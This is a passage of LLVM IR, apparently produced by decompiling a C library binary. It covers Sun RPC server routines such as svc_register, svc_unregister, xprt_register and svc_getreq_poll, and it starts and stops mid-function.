  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 12, 8, 9, 10, 11, 14, 13, 19, 15, 16, 17, 18, 20, 0 }
  uselistorder label %dec_label_pc_17b4c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17b18, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_17b10, { 1, 0 }
  uselistorder label %dec_label_pc_17adc, { 2, 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_17aa0, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_17b60 = call i32 @_rpc_dtablesize()
  %v0_17b64 = load i32, i32* @r4, align 4
  store i32 %v0_17b64, i32* @r6, align 4
  store i32 %v0_17b60, i32* @r8, align 4
  store i32 0, i32* @r7, align 4
  %v5_17bb09 = icmp sgt i32 %v0_17b60, 0
  br i1 %v5_17bb09, label %dec_label_pc_17b74, label %dec_label_pc_17bb4

dec_label_pc_17b74:                               ; preds = %entry, %dec_label_pc_17ba4
  %v0_17b74 = phi i32 [ %v1_17ba4, %dec_label_pc_17ba4 ], [ %v0_17b64, %entry ]
  %v1_17b74 = inttoptr i32 %v0_17b74 to i32*
  %v2_17b74 = load i32, i32* %v1_17b74, align 4
  store i32 %v2_17b74, i32* @r4, align 4
  %v1_17b9019 = call i32 @ffs(i32 %v2_17b74)
  store i32 %v1_17b9019, i32* @r5, align 4
  %v2_17b9421 = icmp eq i32 %v1_17b9019, 0
  %v0_17b9822 = load i32, i32* @r7, align 4
  %v2_17b9823 = add i32 %v1_17b9019, -1
  %v1_17b9c24 = add i32 %v2_17b9823, %v0_17b9822
  br i1 %v2_17b9421, label %dec_label_pc_17ba4, label %dec_label_pc_17b7c

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b74, %dec_label_pc_17b7c
  %v1_17b9c25 = phi i32 [ %v1_17b9c, %dec_label_pc_17b7c ], [ %v1_17b9c24, %dec_label_pc_17b74 ]
  %v1_17b7c = call i32 @svc_getreq_common(i32 %v1_17b9c25)
  %v0_17b80 = load i32, i32* @r5, align 4
  %v1_17b80 = add i32 %v0_17b80, -1
  %v0_17b88 = load i32, i32* @r4, align 4
  %v7_17b88 = shl i32 1, %v1_17b80
  %v8_17b88 = xor i32 %v0_17b88, %v7_17b88
  store i32 %v8_17b88, i32* @r4, align 4
  %v1_17b90 = call i32 @ffs(i32 %v8_17b88)
  store i32 %v1_17b90, i32* @r5, align 4
  %v2_17b94 = icmp eq i32 %v1_17b90, 0
  %v0_17b98 = load i32, i32* @r7, align 4
  %v2_17b98 = add i32 %v1_17b90, -1
  %v1_17b9c = add i32 %v2_17b98, %v0_17b98
  br i1 %v2_17b94, label %dec_label_pc_17ba4, label %dec_label_pc_17b7c

dec_label_pc_17ba4:                               ; preds = %dec_label_pc_17b7c, %dec_label_pc_17b74
  %v0_17b98.lcssa = phi i32 [ %v0_17b9822, %dec_label_pc_17b74 ], [ %v0_17b98, %dec_label_pc_17b7c ]
  %v1_17b9c.lcssa = phi i32 [ %v1_17b9c24, %dec_label_pc_17b74 ], [ %v1_17b9c, %dec_label_pc_17b7c ]
  %v0_17ba4 = load i32, i32* @r6, align 4
  %v1_17ba4 = add i32 %v0_17ba4, 4
  store i32 %v1_17ba4, i32* @r6, align 4
  %v1_17ba8 = add i32 %v0_17b98.lcssa, 32
  store i32 %v1_17ba8, i32* @r7, align 4
  %v1_17bac = load i32, i32* @r8, align 4
  %v5_17bb0 = icmp slt i32 %v1_17ba8, %v1_17bac
  br i1 %v5_17bb0, label %dec_label_pc_17b74, label %dec_label_pc_17bb4

dec_label_pc_17bb4:                               ; preds = %dec_label_pc_17ba4, %entry
  %v20_17bb4 = phi i32 [ %v0_17b60, %entry ], [ %v1_17b9c.lcssa, %dec_label_pc_17ba4 ]
  ret i32 %v20_17bb4

; uselistorder directives
  uselistorder i32 %v1_17ba8, { 1, 0 }
  uselistorder i32 %v1_17ba4, { 1, 0 }
  uselistorder i32 %v8_17b88, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_17b7c, { 1, 0 }
  uselistorder label %dec_label_pc_17b74, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_17bb8 = load i32, i32* @lr, align 4
  store i32 %v0_17bb8, i32* %stack_var_-4, align 4
  %v6_17bb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17bcc

dec_label_pc_17bcc:                               ; preds = %entry, %dec_label_pc_17bcc
  %v5_17bdc4 = phi i32 [ %v6_17bb8, %entry ], [ %v5_17bdc, %dec_label_pc_17bcc ]
  %v2_17bd0 = add i32 %v5_17bdc4, -128
  %v3_17bd0 = inttoptr i32 %v2_17bd0 to i32*
  store i32 0, i32* %v3_17bd0, align 4
  %v0_17bd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v7_17bd8 = icmp eq i32 %v0_17bd8.pre, 31
  %v2_17bdc = and i32 %v0_17bd8.pre, 1073741824
  %v4_17bdc = mul i32 %v0_17bd8.pre, 4
  %v5_17bdc = add i32 %v4_17bdc, %v6_17bb8
  %v1_17be0 = add i32 %v0_17bd8.pre, 1
  store i32 %v1_17be0, i32* %r2.global-to-local, align 4
  %v2_17be4 = icmp eq i32 %v2_17bdc, 0
  %v3_17be4 = or i1 %v7_17bd8, %v2_17be4
  br i1 %v3_17be4, label %dec_label_pc_17bcc, label %dec_label_pc_17be8

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17bcc
  %v0_17bec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17bec, i32* %stack_var_-132, align 4
  %v6_17bf0 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132, i32 %v5_17bdc, i32 %v1_17be0, i32 %v6_17bb8, i32 %v0_17bec)
  ret i32 %v6_17bf0

; uselistorder directives
  uselistorder i32 %v0_17bd8.pre, { 2, 1, 0, 3 }
  uselistorder i32 %v6_17bb8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bcc, { 1, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_17bfc = load i32, i32* @r4, align 4
  %v6_17bfc = load i32, i32* @r5, align 4
  %v9_17bfc = load i32, i32* @r6, align 4
  %v12_17bfc = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_17c10 = call i32 @svc_find(i32 %arg1, i32 %arg2, i32* nonnull %stack_var_-24)
  store i32 %v4_17c10, i32* @r4, align 4
  %v2_17c14 = icmp eq i32 %v4_17c10, 0
  br i1 %v2_17c14, label %dec_label_pc_17c54, label %dec_label_pc_17c1c

dec_label_pc_17c1c:                               ; preds = %entry
  %v2_17c1c = load i32, i32* %stack_var_-24, align 4
  %v1_17c20 = inttoptr i32 %v4_17c10 to i32*
  %v2_17c20 = load i32, i32* %v1_17c20, align 4
  store i32 %v2_17c20, i32* @r5, align 4
  %v2_17c24 = icmp eq i32 %v2_17c1c, 0
  br i1 %v2_17c24, label %dec_label_pc_17c30, label %bb

bb:                                               ; preds = %dec_label_pc_17c1c
  %v3_17c28 = inttoptr i32 %v2_17c1c to i32*
  store i32 %v2_17c20, i32* %v3_17c28, align 4
  br label %dec_label_pc_17c38

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c1c
  %v0_17c30 = call i32 @__rpc_thread_variables()
  %v0_17c34 = load i32, i32* @r5, align 4
  %v2_17c34 = add i32 %v0_17c30, 184
  %v3_17c34 = inttoptr i32 %v2_17c34 to i32*
  store i32 %v0_17c34, i32* %v3_17c34, align 4
  br label %dec_label_pc_17c38

dec_label_pc_17c38:                               ; preds = %bb, %dec_label_pc_17c30
  %v0_17c3c = load i32, i32* @r4, align 4
  store i32 %v0_17c3c, i32* @r0, align 4
  %v2_17c40 = inttoptr i32 %v0_17c3c to i32*
  store i32 0, i32* %v2_17c40, align 4
  %v0_17c44 = call i32 @free()
  %v0_17c48 = load i32, i32* @r6, align 4
  %v0_17c4c = load i32, i32* @r7, align 4
  %v2_17c50 = call i32 @__GI_pmap_unset(i32 %v0_17c48, i32 %v0_17c4c)
  br label %dec_label_pc_17c54

dec_label_pc_17c54:                               ; preds = %entry, %dec_label_pc_17c38
  %v17_17c58 = phi i32 [ 0, %entry ], [ %v2_17c50, %dec_label_pc_17c38 ]
  store i32 %v3_17bfc, i32* @r4, align 4
  store i32 %v6_17bfc, i32* @r5, align 4
  store i32 %v9_17bfc, i32* @r6, align 4
  store i32 %v12_17bfc, i32* @r7, align 4
  ret i32 %v17_17c58

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_17c54, { 1, 0 }
  uselistorder label %dec_label_pc_17c38, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %v0_17c6c1 = call i32 @__rpc_thread_variables()
  %v1_17c702 = add i32 %v0_17c6c1, 184
  %v2_17c703 = inttoptr i32 %v1_17c702 to i32*
  %v3_17c704 = load i32, i32* %v2_17c703, align 4
  %v2_17c746 = icmp eq i32 %v3_17c704, 0
  br i1 %v2_17c746, label %dec_label_pc_17c7c, label %dec_label_pc_17c64

dec_label_pc_17c64:                               ; preds = %entry, %dec_label_pc_17c64
  %v0_17c64 = phi i32 [ %v3_17c70, %dec_label_pc_17c64 ], [ %v3_17c704, %entry ]
  %v1_17c64 = add i32 %v0_17c64, 4
  %v2_17c64 = inttoptr i32 %v1_17c64 to i32*
  %v3_17c64 = load i32, i32* %v2_17c64, align 4
  %v4_17c64 = add i32 %v0_17c64, 8
  %v5_17c64 = inttoptr i32 %v4_17c64 to i32*
  %v6_17c64 = load i32, i32* %v5_17c64, align 4
  %v2_17c68 = call i32 @svc_unregister(i32 %v3_17c64, i32 %v6_17c64)
  %v0_17c6c = call i32 @__rpc_thread_variables()
  %v1_17c70 = add i32 %v0_17c6c, 184
  %v2_17c70 = inttoptr i32 %v1_17c70 to i32*
  %v3_17c70 = load i32, i32* %v2_17c70, align 4
  %v2_17c74 = icmp eq i32 %v3_17c70, 0
  br i1 %v2_17c74, label %dec_label_pc_17c7c, label %dec_label_pc_17c64

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c64, %entry
  %v0_17c6c.lcssa = phi i32 [ %v0_17c6c1, %entry ], [ %v0_17c6c, %dec_label_pc_17c64 ]
  ret i32 %v0_17c6c.lcssa

; uselistorder directives
  uselistorder i32 %v3_17c70, { 1, 0 }
  uselistorder i32 %v0_17c64, { 1, 0 }
  uselistorder label %dec_label_pc_17c64, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg5, i32* @sl, align 4
  %v4_17ca8 = call i32 @svc_find(i32 %arg2, i32 %arg3, i32* nonnull %stack_var_-32)
  %v2_17cac = icmp eq i32 %v4_17ca8, 0
  br i1 %v2_17cac, label %dec_label_pc_17cc8, label %dec_label_pc_17cb8

dec_label_pc_17cb8:                               ; preds = %entry
  %v1_17cb8 = add i32 %v4_17ca8, 12
  %v2_17cb8 = inttoptr i32 %v1_17cb8 to i32*
  %v3_17cb8 = load i32, i32* %v2_17cb8, align 4
  %v1_17cbc = load i32, i32* @r7, align 4
  %v9_17cbc = icmp eq i32 %v3_17cb8, %v1_17cbc
  br i1 %v9_17cbc, label %dec_label_pc_17ce8, label %dec_label_pc_17d14

dec_label_pc_17cc8:                               ; preds = %entry
  %v1_17cc8 = call i32 @malloc(i32 16)
  store i32 %v1_17cc8, i32* @r4, align 4
  %v2_17ccc = icmp eq i32 %v1_17cc8, 0
  br i1 %v2_17ccc, label %dec_label_pc_17d14, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc8
  %v1_17cd4 = add i32 %v1_17cc8, 4
  %v2_17cd4 = inttoptr i32 %v1_17cd4 to i32*
  %v3_17cd4 = load i32, i32* @r5, align 4
  store i32 %v3_17cd4, i32* %v2_17cd4, align 4
  %v4_17cd4 = add i32 %v1_17cc8, 8
  %v5_17cd4 = inttoptr i32 %v4_17cd4 to i32*
  %v6_17cd4 = load i32, i32* @r6, align 4
  store i32 %v6_17cd4, i32* %v5_17cd4, align 4
  %v7_17cd4 = add i32 %v1_17cc8, 12
  %v8_17cd4 = inttoptr i32 %v7_17cd4 to i32*
  %v9_17cd4 = load i32, i32* @r7, align 4
  store i32 %v9_17cd4, i32* %v8_17cd4, align 4
  %v0_17cd8 = call i32 @__rpc_thread_variables()
  %v1_17cdc = add i32 %v0_17cd8, 184
  %v2_17cdc = inttoptr i32 %v1_17cdc to i32*
  %v3_17cdc = load i32, i32* %v2_17cdc, align 4
  %v1_17ce0 = load i32, i32* @r4, align 4
  %v2_17ce0 = inttoptr i32 %v1_17ce0 to i32*
  store i32 %v3_17cdc, i32* %v2_17ce0, align 4
  %v0_17ce4 = load i32, i32* @r4, align 4
  store i32 %v0_17ce4, i32* %v2_17cdc, align 4
  br label %dec_label_pc_17ce8

dec_label_pc_17ce8:                               ; preds = %dec_label_pc_17cb8, %dec_label_pc_17cd4
  %v0_17ce8 = load i32, i32* @sl, align 4
  %v2_17ce8 = icmp eq i32 %v0_17ce8, 0
  br i1 %v2_17ce8, label %dec_label_pc_17d18, label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17ce8
  %v0_17cf0 = load i32, i32* @r6, align 4
  %v0_17cec = load i32, i32* @r5, align 4
  %v0_17cfc = load i32, i32* @r8, align 4
  %v1_17cfc = add i32 %v0_17cfc, 5
  %v2_17cfc = inttoptr i32 %v1_17cfc to i8*
  %v3_17cfc = load i8, i8* %v2_17cfc, align 1
  %v4_17cfc = zext i8 %v3_17cfc to i32
  %v1_17d00 = add i32 %v0_17cfc, 4
  %v2_17d00 = inttoptr i32 %v1_17d00 to i8*
  %v3_17d00 = load i8, i8* %v2_17d00, align 1
  %v4_17d00 = zext i8 %v3_17d00 to i32
  %v4_17d04 = mul nuw nsw i32 %v4_17cfc, 256
  %v5_17d04 = or i32 %v4_17d00, %v4_17d04
  %v4_17d08 = call i32 @pmap_set(i32 %v0_17cec, i32 %v0_17cf0, i32 %v0_17ce8, i32 %v5_17d04)
  br label %dec_label_pc_17d18

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17cb8, %dec_label_pc_17cc8
  br label %dec_label_pc_17d18

dec_label_pc_17d18:                               ; preds = %dec_label_pc_17ce8, %dec_label_pc_17cfc, %dec_label_pc_17d14
  %v0_17d18 = phi i32 [ 1, %dec_label_pc_17ce8 ], [ %v4_17d08, %dec_label_pc_17cfc ], [ 0, %dec_label_pc_17d14 ]
  ret i32 %v0_17d18

; uselistorder directives
  uselistorder i32 %v1_17cc8, { 2, 1, 0, 3, 4 }
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17d18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d14, { 1, 0 }
  uselistorder label %dec_label_pc_17ce8, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_17d24 = load i32, i32* @r4, align 4
  store i32 %v3_17d24, i32* %stack_var_-12, align 4
  %v6_17d24 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_17d2c = load i32, i32* %arg1, align 4
  store i32 %v2_17d2c, i32* @r5, align 4
  %v0_17d30 = call i32 @_rpc_dtablesize()
  %v0_17d34 = load i32, i32* @r5, align 4
  %v5_17d38 = icmp slt i32 %v0_17d34, %v0_17d30
  br i1 %v5_17d38, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v8_17d38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v8_17d38, i32* @r4, align 4
  store i32 %v6_17d24, i32* @r5, align 4
  ret i32 %v0_17d30

bb6:                                              ; preds = %entry
  %v0_17d3c = call i32 @__rpc_thread_variables()
  %v1_17d40 = add i32 %v0_17d3c, 180
  %v2_17d40 = inttoptr i32 %v1_17d40 to i32*
  %v3_17d40 = load i32, i32* %v2_17d40, align 4
  %v0_17d44 = load i32, i32* @r5, align 4
  %v3_17d44 = mul i32 %v0_17d44, 4
  %v2_17d48 = add i32 %v3_17d44, %v3_17d40
  %v3_17d48 = inttoptr i32 %v2_17d48 to i32*
  %v4_17d48 = load i32, i32* %v3_17d48, align 4
  %v1_17d4c = load i32, i32* @r4, align 4
  %v9_17d4c = icmp eq i32 %v4_17d48, %v1_17d4c
  br i1 %v9_17d4c, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  %v3_17d50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17d50, i32* @r4, align 4
  store i32 %v6_17d24, i32* @r5, align 4
  ret i32 %v0_17d3c

bb8:                                              ; preds = %bb6
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v3_17d48, align 4
  %v6_17d60 = icmp slt i32 %v0_17d44, 1024
  br i1 %v6_17d60, label %dec_label_pc_17d64, label %dec_label_pc_17da0

dec_label_pc_17d64:                               ; preds = %bb8
  %v4_17d64 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_17d3c, i32 %v3_17d40, i32 %v3_17d44, i32 %v4_17d48)
  %v0_17d68 = load i32, i32* @r5, align 4
  %v3_17d68 = udiv i32 %v0_17d68, 32
  %v4_17d6c = mul nuw nsw i32 %v3_17d68, 4
  %v5_17d6c = add i32 %v4_17d6c, %v4_17d64
  %v6_17d6c = inttoptr i32 %v5_17d6c to i32*
  %v7_17d6c = load i32, i32* %v6_17d6c, align 4
  %v1_17d70 = urem i32 %v0_17d68, 32
  %tmp10 = shl i32 -1, %v1_17d70
  %v8_17d78 = add i32 %tmp10, -1
  %v9_17d78 = and i32 %v7_17d6c, %v8_17d78
  store i32 %v9_17d78, i32* %v6_17d6c, align 4
  br label %dec_label_pc_17da0

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17da0
  %v0_17d84 = call i32 @__rpc_thread_svc_pollfd()
  %v1_17d88 = inttoptr i32 %v0_17d84 to i32*
  %v2_17d88 = load i32, i32* %v1_17d88, align 4
  %v1_17d8c = load i32, i32* @r4, align 4
  %v4_17d8c = mul i32 %v1_17d8c, 8
  %v5_17d8c = add i32 %v4_17d8c, %v2_17d88
  %v6_17d8c = inttoptr i32 %v5_17d8c to i32*
  %v7_17d8c = load i32, i32* %v6_17d8c, align 4
  %v1_17d90 = load i32, i32* @r5, align 4
  %v9_17d90 = icmp eq i32 %v7_17d8c, %v1_17d90
  br i1 %v9_17d90, label %bb9, label %.thread

bb9:                                              ; preds = %dec_label_pc_17d84
  store i32 -1, i32* %v6_17d8c, align 4
  %v0_17d9c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17d84, %bb9
  %v0_17d9c = phi i32 [ %v1_17d8c, %dec_label_pc_17d84 ], [ %v0_17d9c.pre, %bb9 ]
  %v1_17d9c = add i32 %v0_17d9c, 1
  store i32 %v1_17d9c, i32* @r4, align 4
  br label %dec_label_pc_17da0

dec_label_pc_17da0:                               ; preds = %bb8, %dec_label_pc_17d64, %.thread
  %v0_17da0 = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17da4 = inttoptr i32 %v0_17da0 to i32*
  %v2_17da4 = load i32, i32* %v1_17da4, align 4
  %v0_17da8 = load i32, i32* @r4, align 4
  %v5_17dac = icmp slt i32 %v0_17da8, %v2_17da4
  br i1 %v5_17dac, label %dec_label_pc_17d84, label %dec_label_pc_17db0

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17da0
  %v2_17db0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17db0, i32* @r4, align 4
  store i32 %v6_17d24, i32* @r5, align 4
  ret i32 %v0_17da0

; uselistorder directives
  uselistorder i32 %v0_17d68, { 1, 0 }
  uselistorder i32 %v0_17d44, { 1, 0 }
  uselistorder i32 %v3_17d40, { 1, 0 }
  uselistorder i32 %v0_17d3c, { 1, 0, 2 }
  uselistorder i32 %v6_17d24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17da0, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  br label %dec_label_pc_17e18

dec_label_pc_17dcc:                               ; preds = %bb9
  %v3_17e28 = mul i32 %v0_17e20, 8
  %v0_17dcc = load i32, i32* @r7, align 4
  %v2_17dcc = add i32 %v0_17dcc, %v3_17e28
  %v3_17dcc = inttoptr i32 %v2_17dcc to i32*
  %v4_17dcc = load i32, i32* %v3_17dcc, align 4
  store i32 %v4_17dcc, i32* @r4, align 4
  %v7_17dd0 = icmp eq i32 %v4_17dcc, -1
  br i1 %v7_17dd0, label %dec_label_pc_17e14, label %dec_label_pc_17ddc

dec_label_pc_17ddc:                               ; preds = %dec_label_pc_17dcc
  %v1_17ddc = add i32 %v2_17dcc, 7
  %v2_17ddc = inttoptr i32 %v1_17ddc to i8*
  %v3_17ddc = load i8, i8* %v2_17ddc, align 1
  %v4_17ddc = zext i8 %v3_17ddc to i32
  %v1_17de0 = add i32 %v2_17dcc, 6
  %v2_17de0 = inttoptr i32 %v1_17de0 to i8*
  %v3_17de0 = load i8, i8* %v2_17de0, align 1
  %v4_17de0 = zext i8 %v3_17de0 to i32
  %v4_17de4 = mul nuw nsw i32 %v4_17ddc, 256
  %v5_17de4 = or i32 %v4_17de0, %v4_17de4
  %v7_17de4 = icmp eq i32 %v5_17de4, 0
  br i1 %v7_17de4, label %dec_label_pc_17e14, label %dec_label_pc_17dec

dec_label_pc_17dec:                               ; preds = %dec_label_pc_17ddc
  %v1_17dec = and i32 %v4_17de0, 32
  %v2_17dec = icmp eq i32 %v1_17dec, 0
  %v0_17df4 = load i32, i32* @r6, align 4
  %v1_17df4 = add i32 %v0_17df4, 1
  store i32 %v1_17df4, i32* @r6, align 4
  br i1 %v2_17dec, label %dec_label_pc_17e10, label %dec_label_pc_17dfc

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17dec
  %v0_17dfc = call i32 @__rpc_thread_variables()
  %v1_17e00 = add i32 %v0_17dfc, 180
  %v2_17e00 = inttoptr i32 %v1_17e00 to i32*
  %v3_17e00 = load i32, i32* %v2_17e00, align 4
  %v1_17e04 = load i32, i32* @r4, align 4
  %v4_17e04 = mul i32 %v1_17e04, 4
  %v5_17e04 = add i32 %v4_17e04, %v3_17e00
  %v6_17e04 = inttoptr i32 %v5_17e04 to i32*
  %v7_17e04 = load i32, i32* %v6_17e04, align 4
  %v1_17e08 = inttoptr i32 %v7_17e04 to i32*
  %v2_17e08 = call i32 @xprt_unregister(i32* %v1_17e08)
  br label %dec_label_pc_17e14

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17dec
  %v1_17e10 = call i32 @svc_getreq_common(i32 %v4_17dcc)
  br label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17ddc, %dec_label_pc_17dcc, %dec_label_pc_17dfc, %dec_label_pc_17e10
  %v0_17e14 = load i32, i32* @r5, align 4
  %v1_17e14 = add i32 %v0_17e14, 1
  br label %dec_label_pc_17e18

dec_label_pc_17e18:                               ; preds = %entry, %dec_label_pc_17e14
  %storemerge = phi i32 [ 0, %entry ], [ %v1_17e14, %dec_label_pc_17e14 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_17e18 = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17e1c = inttoptr i32 %v0_17e18 to i32*
  %v2_17e1c = load i32, i32* %v1_17e1c, align 4
  %v0_17e20 = load i32, i32* @r5, align 4
  %v2_17e20 = sub i32 %v0_17e20, %v2_17e1c
  %v4_17e20 = xor i32 %v0_17e20, %v2_17e1c
  %v5_17e20 = xor i32 %v2_17e20, %v0_17e20
  %v6_17e20 = and i32 %v5_17e20, %v4_17e20
  %v5_17e24 = icmp slt i32 %v0_17e20, %v2_17e1c
  br i1 %v5_17e24, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_17e18
  %v6_17e24 = load i32, i32* @r6, align 4
  %v7_17e24 = load i32, i32* @r8, align 4
  %v8_17e24 = sub i32 %v6_17e24, %v7_17e24
  %v10_17e24 = xor i32 %v7_17e24, %v6_17e24
  %v11_17e24 = xor i32 %v8_17e24, %v6_17e24
  %v12_17e24 = and i32 %v11_17e24, %v10_17e24
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_17e18, %bb
  %v1_17e2c.in = phi i32 [ %v6_17e20, %dec_label_pc_17e18 ], [ %v12_17e24, %bb ]
  %v0_17e2c.in = phi i32 [ %v2_17e20, %dec_label_pc_17e18 ], [ %v8_17e24, %bb ]
  %v0_17e2c = icmp slt i32 %v0_17e2c.in, 0
  %v1_17e2c = icmp slt i32 %v1_17e2c.in, 0
  %v2_17e2c = xor i1 %v1_17e2c, %v0_17e2c
  br i1 %v2_17e2c, label %dec_label_pc_17dcc, label %dec_label_pc_17e30

dec_label_pc_17e30:                               ; preds = %bb9
  ret i32 %v0_17e18

; uselistorder directives
  uselistorder i32 %v0_17e20, { 3, 1, 2, 4, 0 }
  uselistorder i32 %v2_17e1c, { 1, 0, 2 }
  uselistorder i32 %v4_17de0, { 1, 0 }
  uselistorder i32 %v4_17dcc, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_17e18, { 1, 0 }
  uselistorder label %dec_label_pc_17e14, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  %v0_17e3c = call i32 @__rpc_thread_variables()
  %v1_17e40 = add i32 %v0_17e3c, 180
  %v2_17e40 = inttoptr i32 %v1_17e40 to i32*
  %v3_17e40 = load i32, i32* %v2_17e40, align 4
  store i32 %v3_17e40, i32* %r3.global-to-local, align 4
  %v2_17e44 = icmp eq i32 %v3_17e40, 0
  store i32 %v0_17e3c, i32* @r4, align 4
  %v0_17e4c = load i32, i32* @r5, align 4
  %v1_17e4c = inttoptr i32 %v0_17e4c to i32*
  %v2_17e4c = load i32, i32* %v1_17e4c, align 4
  store i32 %v2_17e4c, i32* @r7, align 4
  br i1 %v2_17e44, label %dec_label_pc_17e54, label %bb9

dec_label_pc_17e54:                               ; preds = %entry
  %v0_17e54 = call i32 @_rpc_dtablesize()
  %v3_17e58 = mul i32 %v0_17e54, 4
  %v1_17e5c = call i32 @malloc(i32 %v3_17e58)
  %v2_17e60 = icmp eq i32 %v1_17e5c, 0
  %v1_17e64 = load i32, i32* @r4, align 4
  %v2_17e64 = add i32 %v1_17e64, 180
  %v3_17e64 = inttoptr i32 %v2_17e64 to i32*
  store i32 %v1_17e5c, i32* %v3_17e64, align 4
  br i1 %v2_17e60, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_17e54
  ret i32 0

bb9:                                              ; preds = %entry, %dec_label_pc_17e54
  %v0_17e6c = call i32 @_rpc_dtablesize()
  %v0_17e70 = load i32, i32* @r7, align 4
  %v5_17e74 = icmp slt i32 %v0_17e70, %v0_17e6c
  br i1 %v5_17e74, label %bb11, label %bb10

bb10:                                             ; preds = %bb9
  ret i32 %v0_17e6c

bb11:                                             ; preds = %bb9
  %v0_17e78 = load i32, i32* @r4, align 4
  %v1_17e78 = add i32 %v0_17e78, 180
  %v2_17e78 = inttoptr i32 %v1_17e78 to i32*
  %v3_17e78 = load i32, i32* %v2_17e78, align 4
  store i32 %v3_17e78, i32* %r3.global-to-local, align 4
  %v0_17e80 = load i32, i32* @r5, align 4
  %v5_17e80 = mul i32 %v0_17e70, 4
  %v6_17e80 = add i32 %v3_17e78, %v5_17e80
  %v7_17e80 = inttoptr i32 %v6_17e80 to i32*
  store i32 %v0_17e80, i32* %v7_17e80, align 4
  %v6_17e84 = icmp slt i32 %v0_17e70, 1024
  br i1 %v6_17e84, label %dec_label_pc_17e88, label %dec_label_pc_17eec

dec_label_pc_17e88:                               ; preds = %bb11
  %v1_17e88 = load i32, i32* @r1, align 4
  %v2_17e88 = load i32, i32* @r2, align 4
